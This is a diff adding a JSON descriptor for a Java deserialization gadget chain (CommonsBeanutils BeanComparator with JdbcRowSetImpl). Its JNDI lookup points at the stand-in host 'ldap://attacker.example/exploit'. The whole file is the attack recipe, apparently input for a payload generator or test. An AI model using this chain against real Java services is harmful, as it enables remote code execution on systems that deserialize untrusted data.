@@ -1,0 +1,21 @@
+{
+  "chain_type": "CB1-JNDI — BeanComparator + JdbcRowSetImpl (JNDI lookup)",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→BeanComparator.compare→JdbcRowSetImpl.getDatabaseMetaData→JNDI",
+  "links": [
+    {
+      "class": "org.apache.commons.beanutils.BeanComparator",
+      "field_overrides": {
+        "property": "databaseMetaData",
+        "comparator": null
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker.example/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
